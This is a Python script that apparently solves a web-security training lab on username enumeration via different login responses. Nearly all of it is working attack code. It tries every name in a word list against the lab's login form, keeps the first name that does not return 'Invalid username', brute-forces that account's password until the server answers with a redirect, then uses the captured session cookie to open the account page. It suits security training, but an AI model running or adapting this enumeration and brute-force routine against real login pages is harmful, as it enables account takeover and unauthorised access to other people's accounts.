"""
Lab: Username enumeration via different responses

Goal: Obtain a valid username and their password.

Analysis:
- Read usernames list from file
- Read passwords list from file
- For each username, try to login with any password
- if "Invalid username" not in try_login.text -> return username
- for each password, try to login, watching status code.
    if status_code == 302 then return valid password
- fetch("my-account", cookies)
- if "Congratulations" in requests.get(LAB_URL).text:

"""
import time
import sys
import requests
from helpers import read_file

LAB_URL = "https://0a08007003a7fa1c833174c2003b0055.web-security-academy.net/"
SCRIPT_START_TIME = time.time()
PASSWORDS_LIST_PATH = "../passwords.txt"
USERNAME_LIST_PATH = "../usernames.txt"


def login(username, password):
    """Login function"""
    login_url = f"{LAB_URL}login"
    login_data = {
        "username": username,
        "password": password
    }
    try:
        response = requests.post(
            login_url, data=login_data, timeout=10, allow_redirects=False)
        return response
    except requests.exceptions.ConnectionError:
        print("Error: cannot connect to server")
        sys.exit(1)
    except requests.exceptions.ReadTimeout:
        print("Error: Read timed out")
        sys.exit(1)
    except KeyboardInterrupt:
        print("Keyboard interrupt")
        sys.exit(1)


def find_valid_user(username_list):
    """Find valid user"""
    for username in username_list.splitlines():
        try_login = login(username, "any_password")
        if try_login.status_code == 200:
            if "Invalid username" not in try_login.text:
                print(f"Valid username: {username}")
                return username


def find_valid_password(username, passwords_list):
    """Find valid password"""
    for password in passwords_list.splitlines():
        try_login = login(username, password)
        if try_login.status_code == 302:
            print(f"Valid password: {password}")
            session = try_login.cookies.get("session")
            print(f"Session: {session}")
            return (password, session)


def fetch(path, cookies):
    """Fetch function"""
    try:
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, timeout=10, allow_redirects=False)
    except requests.exceptions.ConnectionError:
        print("Error: cannot connect to server")
        sys.exit(1)


def main():
    """Main function"""
    print("Username enumeration via different responses")
    print("Reading usernames list from file...", end="")

    username_list = read_file(USERNAME_LIST_PATH)
    if username_list is None:
        print("Error: cannot read usernames list from file")
        sys.exit(1)
    print("done")
    print("Reading passwords list from file...", end="")

    passwords_list = read_file(PASSWORDS_LIST_PATH)
    if passwords_list is None:
        print("Error: cannot read passwords list from file")
        sys.exit(1)
    print("done")

    valid_username = find_valid_user(username_list)
    (valid_password, valid_session) = find_valid_password(
        valid_username, passwords_list)

    print(f"Valid username: {valid_username}")
    print(f"Valid password: {valid_password}")
    print(f"Session: {valid_session}")

    cookies = {"session": valid_session}
    fetch("my-account", cookies)

    if "Congratulations, you solved the lab!" in requests.get(LAB_URL, timeout=10).text:
        print("Congratulations, you solved the lab!")


if __name__ == "__main__":
    main()
